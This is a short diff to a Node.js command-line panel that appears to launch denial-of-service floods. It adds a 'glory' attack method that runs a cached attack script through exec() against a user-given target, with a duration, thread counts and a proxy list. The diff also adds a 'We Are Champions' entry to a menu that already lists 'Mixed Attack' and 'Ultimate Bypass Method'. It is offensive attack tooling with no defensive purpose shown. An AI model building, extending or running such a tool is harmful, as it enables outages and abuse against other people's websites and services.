@@ -341,6 +341,10 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
           sigma()
           } else if (methods === 'mixv2') {
        pushOngoing(target, methods, duration)
+       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+          sigma()
+          } else if (methods === 'glory') {
+       pushOngoing(target, methods, duration)
 const destroy = path.join(__dirname, `/lib/cache/destroy`);
 const storm = path.join(__dirname, `/lib/cache/storm`);
 const rape = path.join(__dirname, `/lib/cache/rape`);
@@ -738,6 +742,7 @@ permen.question('\x1b[47m\x1b[31mroot\x1b[0m\x1b[31m✦\x1b[0m\x1b[47m\x1b[31mde
 || lizard     || Ultimate Bypass Method
 || mix        || Mixed Attack
 || mixv2      || Mixed Attack V2
+|| glory      || We Are Champions
 [=========================================]
 `);
     sigma();
